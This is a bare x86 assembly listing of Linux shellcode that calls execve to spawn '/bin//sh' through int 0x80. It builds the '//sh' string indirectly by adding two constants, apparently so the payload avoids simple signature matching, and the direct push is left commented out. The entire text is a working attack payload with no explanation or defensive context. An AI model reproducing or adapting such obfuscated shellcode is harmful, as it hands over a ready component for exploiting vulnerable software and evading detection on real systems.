

global _start
section .text
_start:
	xor eax,eax
	push eax
	mov al,10
	inc eax
;	xor edx,edx
;	push edx


	;push dword 0x68732f2f
	mov ebx,    0x11111111
	mov ecx,    0x57621e1e
	add ecx,ebx
	push ecx
	push dword 0x6e69622f


	mov ebx, esp
	xor ecx, ecx
	int 0x80
